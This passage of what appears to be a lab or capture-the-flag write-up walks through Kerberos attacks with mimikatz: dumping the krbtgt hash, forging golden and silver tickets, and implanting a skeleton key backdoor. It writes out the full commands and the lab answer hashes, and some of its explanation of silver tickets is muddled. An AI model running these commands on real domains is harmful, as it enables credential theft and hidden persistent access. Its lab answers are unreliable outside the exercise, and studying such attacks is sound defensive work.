A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

#### Dump the krbtgt hash

We need to dump the hash as well as the security identifier needed to create a Golden Ticket.

To create a silver ticket is necessary to change the /name: to 'krbtgt' and dump the hash of either a domain admin account or a service account such as the SQLService account.

```bash
cd Downloads
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

#### Create a Golden/Silver Ticket

Starting to the following command base: `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`

to create a golden ticket we need to put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

```bash
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

and spawn a new shell with new privileges usugin: `misc::cmd` command.

### 7.1 - What is the SQLService NTLM Hash?

We can check all NTLM hash executing `lsadump::lsa /patch`

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
cd40c9ed96265531b21fc5b1dafcfb0a
{% endhint %}

### 7.2 - What is the Administrator NTLM Hash?

{% hint style="info" %}
2777b7fec870e04dda00cd7260f7bee6
{% endhint %}

## Task 8 - Kerberos Backdoors w/ mimikatz

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.&#x20;

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.&#x20;

The default hash for a mimikatz skeleton key is _60BA4FCADC466C7A033C178194C03DF6_ which makes the password -"_mimikatz_"

This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.

#### Skeleton Key Overview

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

#### Installing the Skeleton Key w/ mimikatz

```bash
cd Downloads && mimikatz.exe
privilege::debug
misc::skeleton
```

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

It permits to access the forest and the default credentials will be: "_mimikatz_".

example: `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz`

## Task 9- Conclusion

#### Resources

* [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
* [https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
* [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
* [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)
* [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
* [https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)
* [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
